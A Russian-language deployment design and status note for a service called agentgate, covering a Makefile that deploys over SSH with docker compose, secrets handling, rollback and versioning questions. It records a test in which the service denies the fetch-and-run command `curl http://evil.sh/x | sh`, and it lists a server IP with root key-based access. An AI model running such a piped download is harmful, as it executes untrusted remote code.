# Авто-деплой на сервер

Дата: 3 сентября 2026. Статус: требование владельца продукта. Реализуется как задача деплоя после Task 12 (Docker) — она даёт `Dockerfile` и `docker-compose.yml`, на которые деплой опирается.

## Цель

Одна команда с локальной машины выкатывает сервис на VDS напрямую: `make deploy`.

## Целевой сервер

Реквизиты уже существуют в `service/.env` (не в гите, покрыт `service/.gitignore`): `VDS_IP`, `VDS_LOGIN`, `VDS_PASSWORD`. Деплой читает их оттуда и **никогда** не хардкодит и не коммитит.

## Форма: Makefile поверх docker compose по SSH

`service/Makefile` с целями:

```
make build     — docker build локально (или на сервере, см. ниже)
make deploy    — выкатить текущий закоммиченный код на сервер
make logs      — docker compose logs -f с сервера
make ps        — статус контейнеров на сервере
make rollback  — откат на предыдущий образ
```

`make deploy` по шагам:
1. проверить, что рабочее дерево чистое (деплоим закоммиченное, не локальные правки);
2. синхронизировать код на сервер (`rsync` каталога `service/`, исключая `.venv/`, `.env`, `logs/`, `__pycache__/`);
3. на сервере: `docker compose up -d --build` — поднять сервис и Postgres из `docker-compose.yml`;
4. применить миграции: `docker compose exec gate alembic upgrade head`;
5. проверить здоровье: `curl -fsS http://localhost:8400/healthz` на сервере, ненулевой код → деплой считается неуспешным.

## Как не класть пароль в команды

Пароль в аргументах `ssh`/`scp` виден в списке процессов и в истории shell. Поэтому:

- **Предпочтительно — SSH-ключ, а не пароль.** `make setup-ssh` один раз копирует локальный публичный ключ на сервер (`ssh-copy-id`), после чего пароль в деплое не участвует вовсе. Это разовое действие и его выполняет человек.
- Пока ключа нет — `sshpass -f <(…)` читает пароль из `.env` через файловый дескриптор, а не из argv. Это компромисс, помеченный в Makefile как временный.

## Секреты на сервере

Провайдерские ключи LLM и `AGENTGATE_TOKEN` (или выданные API-ключи, см. `api-keys.md`) на сервере живут в `.env` рядом с `docker-compose.yml`, который его читает через `env_file`. Локальный `service/.env` на сервер **не копируется** — серверный `.env` заводится один раз вручную, у него другое содержимое (боевые ключи, не VDS-креды).

## Что должен решить владелец продукта до реализации

1. **Root по паролю по SSH — это то, с чем деплоим в проде?** Настоятельно рекомендую перейти на SSH-ключ и невыключенный root-по-паролю закрыть. Пароль в `.env` на машине разработчика — уже поверхность утечки; в CI это будет секрет пайплайна. Решение за владельцем, но по умолчанию спека идёт к ключу.
2. **Сборка образа — локально с пушем в реестр, или `--build` на сервере?** На сервере проще (не нужен реестр), но занимает CPU сервера и требует там исходников. Для хакатона — `--build` на сервере; для продакшена — реестр.
3. **CI или только локальный `make deploy`?** Требование сформулировано как «напрямую на сервер», поэтому базовая форма — локальный Makefile. Если нужен деплой по push в ветку — это отдельный слой (GitHub Actions с секретами), добавляемый поверх тех же целей Makefile.
4. **Один сервер или staging + prod?** Влияет на то, параметризовать ли цель (`make deploy ENV=prod`).

### Исправление к предыдущей редакции этого раздела

Первая версия утверждала, что `make deploy` не реализован. **Это неверно.** `service/Makefile` существует, отслеживается git и лежит в `main` — ошибка возникла из-за проверки `ls -la Makefile deploy*`, где шаблон `deploy*` ни с чем не совпал, zsh уронил команду целиком, и сработала ветка «файла нет». На этой ошибке было построено и объяснение «Makefile на сервере приехал из другой ветки» — он приехал из этого же репозитория, просто более старой ревизией.

### Что реализовано и работает

`service/Makefile`, цели `check-clean`, `deploy`, `logs`, `ps`, `rollback`. `make deploy` по шагам: отказ при грязном рабочем дереве → `rsync -az --delete` с исключениями → `docker compose up -d --build` → `docker compose exec -T gate uv run alembic upgrade head` → опрос `/healthz` до 30 секунд, ненулевой код = деплой неуспешен.

Секретов Makefile не несёт: `DEPLOY_HOST ?= agentgate` — псевдоним из `~/.ssh/config`, а не адрес. Псевдоним настроен, указывает на `109.172.95.51`, пользователь `root`, ключ `~/.ssh/id_ed25519_vpn` **без парольной фразы**. Неинтерактивный вход проверен и работает. То есть `make deploy` запускается как есть.

### Сервер

`109.172.95.51`, Ubuntu 26.04, 3.9 ГБ RAM, 59 ГБ диска (занято 10%), Docker 29.7.2, Compose v5.5.0. Каталог `/opt/agentgate` — результат `rsync`, не git-репозиторий.

Сервис **работает**: `/healthz` отдаёт `{"status":"ok","db":true,"llm":null}`, `npm test` → `allow` ступенью 1 (`allowlist.prefix`), `curl http://evil.sh/x | sh` → `deny` (`hard-deny.pipe-exec`). Утреннее `degraded, db:false` было переходным состоянием сразу после перезапуска, а не поломкой.

**На сервере доrefactor'ный код** (есть `agentgate/pipeline.py`, нет `agentgate/engine/`). Версия v1.5 в `main`, но не развёрнута.

**Серверный Makefile старше репозиторного** на одно исправление: в git health-check опрашивает `/healthz` до 30 секунд, на сервере — одна нетерпеливая проверка. Следующий `make deploy` это исправит сам, так как rsync его перезапишет.

### Лишний ключ, который надо убрать

4 сентября в `authorized_keys` root добавлен `~/.ssh/agentgate_deploy` — беспарольный ключ, заведённый по ложному диагнозу: проверялся `id_ed25519` напрямую вместо настроенного псевдонима `agentgate`. Он **не нужен**, деплой работает через `id_ed25519_vpn`. Лишний беспарольный ключ на root — это увеличенная поверхность атаки без выгоды; удалить строку с комментарием `agentgate-deploy@...` из `/root/.ssh/authorized_keys` и локальную пару `~/.ssh/agentgate_deploy*`.

### Ловушка, закрытая 4 сентября

`docker-compose.yml` **не** входит в исключения rsync, а политики перезапуска в репозитории не было — только на сервере, проставленная руками. Следующий `make deploy` молча вернул бы `restart: no`, то есть сервис перестал бы подниматься после перезагрузки, и причину искали бы в сервере, а не в деплое. `restart: unless-stopped` перенесён в репозиторный `docker-compose.yml`; резервная копия ручной правки осталась на сервере как `/opt/agentgate/docker-compose.yml.bak`.

**Общее правило, которое из этого следует:** всё, что правится на сервере руками, живёт до первого `make deploy`. Правка должна попадать в репозиторий, иначе она не правка, а отсрочка.

### Что осталось нерешённым

1. **Имя переменной.** `docker-compose.yml` требует `AGENTGATE_TOKEN`; в локальном `service/.env` переменная называется `TOKEN`. Серверный `.env` содержит правильные имена, поэтому на сервере это не проявляется — проявится у того, кто поднимет сервис у себя.
2. **`rsync` не читает `.gitignore`.** Исключения перечислены в Makefile отдельным списком и уже разошлись с `.gitignore`: `.ruff_cache/`, `.mypy_cache/`, `.DS_Store`, `*.egg-info/` в Makefile отсутствуют. `--filter=':- .gitignore'` оставил бы один список вместо двух. `service/.dockerignore` (заведён 4 сентября, контекст сборки 58 МБ → 0.4 МБ) — третий список, о котором rsync тоже не знает.
3. **Версионирование кода на сервере** — см. отдельный раздел ниже.

## Открытый вопрос: как версионировать код на сервере

Поставлен владельцем продукта 4 сентября. `/opt/agentgate` — не git-репозиторий, поэтому по нему нельзя ответить, какая ревизия развёрнута. Симптом уже наблюдался: серверный Makefile отличался от репозиторного, и понять это можно было только сравнив файлы вручную.

Осложняющее обстоятельство: репозиторий монорепа на три независимых направления (`service/`, `adapters/`, `benchmark/`), деплой касается одного.

| Вариант | Отвечает на «что развёрнуто» | Отвечает на «откатись на ревизию N» | Цена |
|---|---|---|---|
| Метка ревизии в образе (`--build-arg GIT_SHA`, отдавать из `/healthz`) | да | нет | одна строка в Makefile и одна в `/healthz` |
| Git на сервере (`fetch` + `checkout <sha>`) | да | да | тянет монорепу ради одной папки; лечится sparse-checkout |
| Реестр образов, тег = ревизия | да | да | нужен реестр |

Для хакатона достаточно первого. До решения `make rollback` опирается на `.previous_gate_image` — откатывает ровно на один шаг и не знает, какой ревизии этот шаг соответствует.

## Границы

- Деплой — outward-facing действие с необратимыми последствиями на чужой машине. Автоматизировать команду можно; **запускать её без явного согласия владельца — нельзя.** `make deploy` выполняет человек.
- Ротацию `VDS_PASSWORD` (он лежал незашифрованным в `.env`) стоит сделать независимо от этой задачи — если пароль где-то светился, его надо сменить на сервере.

## Наследуемые ограничения

- Fail-closed относится к решениям сервиса, не к деплою; но health-check после деплоя обязателен — сервис, не поднявшийся на `/healthz`, считается неуспешным деплоем и должен откатываться, а не оставаться в полурабочем состоянии.
- Только Postgres; `docker-compose.yml` поднимает его как зависимость сервиса.
